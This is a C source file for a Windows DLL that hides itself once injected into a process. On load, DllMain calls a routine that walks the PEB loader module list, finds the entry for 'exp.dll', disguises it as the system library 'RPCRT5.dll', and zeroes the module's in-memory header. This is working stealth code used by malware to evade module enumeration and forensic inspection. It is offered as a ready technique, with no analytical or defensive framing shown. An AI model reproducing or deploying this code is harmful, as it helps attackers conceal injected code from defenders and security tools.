//changing LDR module list to hide an injected dll


#include <stdio.h>
#include <windows.h>
#include <shlwapi.h>

#pragma comment(lib, "shlwapi.lib")


typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;
typedef UNICODE_STRING *PUNICODE_STRING;


typedef struct _LDR_DATA_TABLE_ENTRY {
    PVOID Reserved1[2];
    LIST_ENTRY InMemoryOrderLinks;
    PVOID Reserved2[2];
    PVOID DllBase;
    PVOID Reserved3[2];
    UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
    BYTE Reserved4[8];
    PVOID Reserved5[3];
#pragma warning(push)
#pragma warning(disable: 4201) // we'll always use the Microsoft compiler
    union {
        ULONG CheckSum;
        PVOID Reserved6;
    } DUMMYUNIONNAME;
#pragma warning(pop)
    ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
  BYTE       Reserved1[8];
  PVOID      Reserved2[3];
  LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _PEB {
  BYTE                          Reserved1[2];
  BYTE                          BeingDebugged;
  BYTE                          Reserved2[1];
  PVOID                         Reserved3[2];
  PPEB_LDR_DATA                 Ldr;
  } PEB, *PPEB;

int hideModule() {

	PEB * peb;
	
	//finding PEB address
	#if defined(_M_X64) // x64
	peb = (PEB *) __readgsqword(0x60);
	#else // x86
	peb = (PEB *) __readfsdword(0x60);
	#endif

	DWORD old;

	LIST_ENTRY * fEntry = peb->Ldr->InMemoryOrderModuleList.Flink;
		
	while(fEntry != &(peb->Ldr->InMemoryOrderModuleList)){
		LDR_DATA_TABLE_ENTRY * table_entry = (LDR_DATA_TABLE_ENTRY *)((char *)fEntry - sizeof(LIST_ENTRY));
		if (StrStrIW(table_entry->FullDllName.Buffer, L"exp.dll")){
			table_entry->FullDllName.Buffer = L"C:\\Windows\\System32\\RPCRT5.dll";
			table_entry->BaseDllName.Buffer = L"RPCRT5.dll";
			table_entry->BaseDllName.Length = 2* wcslen(L"RPCRT5.dll");
			table_entry->BaseDllName.MaximumLength = 2*2* wcslen(L"RPCRT5.dll");
			VirtualProtect(table_entry->DllBase, 4096, PAGE_READWRITE, &old);
			ZeroMemory(table_entry->DllBase, 4096);
			VirtualProtect(table_entry->DllBase, 4096, old, &old);
		}
		fEntry = fEntry->Flink;
	}
	
	printf("Module: %p \n", fEntry);
	
	return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD dwReason, LPVOID reserved) {

    switch (dwReason)  {
		case DLL_PROCESS_ATTACH:
			hideModule();
			break;
		case DLL_THREAD_ATTACH:
			break;
		case DLL_THREAD_DETACH:
			break;
		case DLL_PROCESS_DETACH:
			break;
	}
	
    return TRUE;
}

